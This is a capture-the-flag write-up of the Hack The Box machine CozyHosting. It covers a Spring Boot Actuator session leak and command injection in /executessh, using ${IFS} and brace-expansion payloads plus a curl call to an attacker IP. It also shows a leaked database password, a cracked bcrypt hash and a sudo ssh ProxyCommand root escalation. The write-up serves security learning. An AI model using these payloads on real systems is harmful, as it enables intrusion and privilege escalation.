---
layout: post
title: "HTB: CozyHosting"
subtitle: "Spring Boot Actuator session leak, command injection in /executessh, cracked bcrypt to SSH, sudo ssh ProxyCommand to root"
date: 2023-09-03
tags: [htb, linux, command-injection, info-disclosure, privesc]
category: writeups
kind: machine
tldr: "An exposed Spring Boot Actuator handed me a live admin JSESSIONID. The admin panel's /executessh endpoint injected the username into a shell command, giving a shell as app. Postgres creds from the JAR let me dump and crack an admin bcrypt hash, which logged in josh over SSH. sudo /usr/bin/ssh with a ProxyCommand gave root."
---

## the box

CozyHosting is a Linux box running nginx 1.18.0 on port 80 and SSH on 22. Port 80 fronts a Spring Boot app (`cozyhosting.htb`) on local 8080, with PostgreSQL on 5432.

## recon

nmap showed 22 (OpenSSH 8.9p1, Ubuntu 22.04) and 80. Content discovery turned up the login routes and, more usefully, exposed Actuator endpoints:

```
[200] /actuator
[200] /actuator/env
[200] /actuator/sessions
[200] /actuator/mappings
[200] /actuator/beans
```

`/actuator/sessions` mapped live JSESSIONIDs to usernames:

```
{
  "AE398A2BA899A092C97EDFAFDF4F781E": "UNAUTHORIZED",
  "A0F3EA897AB3AAE89DD2E4AC6975C649": "kanderson",
  "FE773B92F068E412D09EFB5F1C1300E6": "UNAUTHORIZED"
}
```

## foothold

Setting the leaked kanderson JSESSIONID as my cookie got me into `/admin`. The admin panel posts to `/executessh` with `username` and `host`, which the app drops into a shell command:

```java
Process process = Runtime.getRuntime().exec(new String[]{"/bin/bash", "-c",
    String.format("ssh -o ConnectTimeout=1 %s@%s", username, host)});
```

The validator only rejected whitespace in `username`, so I used `${IFS}` instead of spaces and terminated the ssh command with a semicolon. POST to `/executessh`:

```
host=127.0.0.1&username=;curl${IFS}http://10.10.14.105:8000/;
```

Brace expansion is an equivalent space-free form: `username=;{curl,http://10.10.14.105:8000/};#`.

Swapping the curl for a reverse shell payload landed a shell as `app`.

## user

The app directory held `cloudhosting-0.0.1.jar`. Its `application.properties` carried the Postgres credentials:

```
spring.datasource.url=jdbc:postgresql://localhost:5432/cozyhosting
spring.datasource.username=postgres
spring.datasource.password=Vg&nvzAQ7XxR
```

Connecting to the DB and dumping `users` gave two bcrypt hashes:

```
psql -U postgres -h localhost -p 5432 -W
SELECT * FROM users;
```

```
 admin | $2a$10$SpKYdHLB0FOaT7n3x72wtuS0yR8uqqbNNpIPjUb2MZib3H9kVO8dm | Admin
```

john cracked the admin hash (bcrypt, `$2a$`) to `manchesterunited`. Hashcat mode 3200 does the same. That password worked for the SSH user `josh`:

```
hashcat -m 3200 hash rockyou.txt   # -> manchesterunited
ssh josh@cozyhosting.htb
```

josh held the user flag.

## root

josh's sudo grant ran ssh as root with any arguments:

```
User josh may run the following commands on localhost:
    (root) /usr/bin/ssh *
```

ssh runs a `ProxyCommand` through the shell, so a crafted ProxyCommand executes as root:

```
sudo /usr/bin/ssh -o ProxyCommand=';sh 0<&2 1>&2' x
```

That dropped a root shell and the root flag.

## takeaway

Actuator endpoints should never be public. The session leak was the whole chain's start, the command injection only needed `${IFS}` to dodge the whitespace filter, and `sudo ssh` is trivially abused via ProxyCommand.
